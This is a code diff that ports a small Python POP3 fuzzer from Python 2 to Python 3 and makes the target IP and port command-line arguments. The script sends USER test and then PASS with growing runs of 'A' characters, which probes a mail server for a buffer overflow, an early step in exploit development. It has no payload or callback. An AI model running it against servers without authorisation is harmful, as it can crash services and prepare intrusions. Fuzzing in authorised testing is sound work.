@@ -1,27 +1,38 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
+import argparse
 import os
 import socket
 
-os.system("clear")
 
-# Create an array of buffers from 10 to 2000, with increments of 20.
-buffer=["A"]
-counter=100
+def main():
+    parser = argparse.ArgumentParser(description='POP3 PASS buffer fuzzer.')
+    parser.add_argument('target', help='target IP address')
+    parser.add_argument('-p', '--port', type=int, default=110, help='target port (default: 110)')
+    args = parser.parse_args()
 
-while len(buffer) <= 30:
-     buffer.append("A"*counter)
-     counter=counter+200
+    os.system('clear')
 
-for string in buffer:
-     print "\n\nFuzzing PASS with %s bytes." % len(string)
+    buffer = ['A']
+    counter = 100
 
-     s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-     connect=s.connect(("172.16.181.135",110))    # Connect to IP on port 110.
+    while len(buffer) <= 30:
+        buffer.append('A' * counter)
+        counter = counter + 200
 
-     s.recv(1024)                                 # Receive reply.
-     s.send("USER test\r\n")                      # Send username 'test'.
-     s.recv(1024)                                 # Receive reply.
-     s.send("PASS " + string + "\r\n")            # Send password 'PASS' plus random buffer.
-     s.send("QUIT\r\n")                           # Send command 'QUIT'.
-     s.close()                                    # Close socket.
+    for string in buffer:
+        print(f'\n\nFuzzing PASS with {len(string)} bytes.')
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((args.target, args.port))
+
+        s.recv(1024)
+        s.send(b'USER test\r\n')
+        s.recv(1024)
+        s.send(b'PASS ' + string.encode() + b'\r\n')
+        s.send(b'QUIT\r\n')
+        s.close()
+
+
+if __name__ == '__main__':
+    main()
